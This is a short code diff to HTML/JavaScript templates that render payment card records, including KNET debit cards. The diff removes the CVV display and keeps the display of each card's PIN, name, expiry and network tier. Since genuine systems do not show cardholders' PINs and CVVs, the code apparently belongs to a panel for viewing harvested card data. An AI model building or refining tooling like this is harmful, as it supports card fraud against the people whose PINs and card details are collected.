@@ -1722,7 +1722,7 @@
               // PIN + CVV + Network row
               html += '<div style="display: flex; justify-content: space-between; align-items: center;">';
               html += '<div><span style="color: #065f46; font-size: 11px;">PIN</span><br><span style="color: #064e3b; font-size: 18px; font-weight: bold;">' + (card.pin || '-') + '</span></div>';
-              html += '<div><span style="color: #065f46; font-size: 11px;">CVV</span><br><span style="color: #064e3b; font-size: 18px; font-weight: bold;">' + (card.cvv || '-') + '</span></div>';
+              
               html += '<div style="text-align: right;"><span style="font-size: 16px; font-weight: bold; color: #047857;">KNET</span><br><span style="color: #065f46; font-size: 11px; font-weight: bold;">DEBIT</span></div>';
               html += '</div>';
               html += '</div>';
@@ -1754,9 +1754,8 @@
               html += '<div style="text-align: left;"><span style="color: #888; font-size: 11px;">Name</span><br><span style="color: #333; font-size: 14px; font-weight: 600;">' + card.nameOnCard + '</span></div>';
               html += '<div style="text-align: right;"><span style="color: #888; font-size: 11px;">Expiry</span><br><span style="color: #333; font-size: 16px; font-weight: bold;">' + card.expiryMonth + '/' + card.expiryYear + '</span></div>';
               html += '</div>';
-              // CVV + Network + Tier row
+              // Network + Tier row
               html += '<div style="display: flex; justify-content: space-between; align-items: center;">';
-              html += '<div><span style="color: #888; font-size: 11px;">CVV</span><br><span style="color: #333; font-size: 18px; font-weight: bold;">' + card.cvv + '</span></div>';
               html += '<div style="text-align: right;"><span style="font-size: 16px; font-weight: bold; color: #1a1f71;">' + networkLogo + '</span><br><span style="color: #555; font-size: 11px; font-weight: bold;">' + cardInfo.type.toUpperCase() + ' • ' + cardInfo.tier.toUpperCase() + '</span></div>';
               html += '</div>';
               html += '</div>';
@@ -2937,7 +2936,7 @@
                 </div>
                 <div style="display: flex; justify-content: space-between; align-items: center;">
                   <div><span style="color: #065f46; font-size: 11px;">PIN</span><br><span style="color: #064e3b; font-size: 18px; font-weight: bold;">` + (card.pin || '-') + `</span></div>
-                  <div><span style="color: #065f46; font-size: 11px;">CVV</span><br><span style="color: #064e3b; font-size: 18px; font-weight: bold;">` + (card.cvv || '-') + `</span></div>
+
                   <div style="text-align: right;"><span style="font-size: 16px; font-weight: bold; color: #047857;">KNET</span><br><span style="color: #065f46; font-size: 11px; font-weight: bold;">DEBIT</span></div>
                 </div>
               </div>
@@ -2962,7 +2961,6 @@
                   <div style="text-align: right;"><span style="color: #888; font-size: 11px;">Expiry</span><br><span style="color: #333; font-size: 16px; font-weight: bold;">` + card.expiryMonth + `/` + card.expiryYear + `</span></div>
                 </div>
                 <div style="display: flex; justify-content: space-between; align-items: center;">
-                  <div><span style="color: #888; font-size: 11px;">CVV</span><br><span style="color: #333; font-size: 18px; font-weight: bold;">` + card.cvv + `</span></div>
                   <div style="text-align: right;"><span style="font-size: 16px; font-weight: bold; color: #1a1f71;">` + networkLogo + `</span><br><span style="color: #555; font-size: 11px; font-weight: bold;">` + card.type.toUpperCase() + ` • ` + card.tier.toUpperCase() + `</span></div>
                 </div>
               </div>
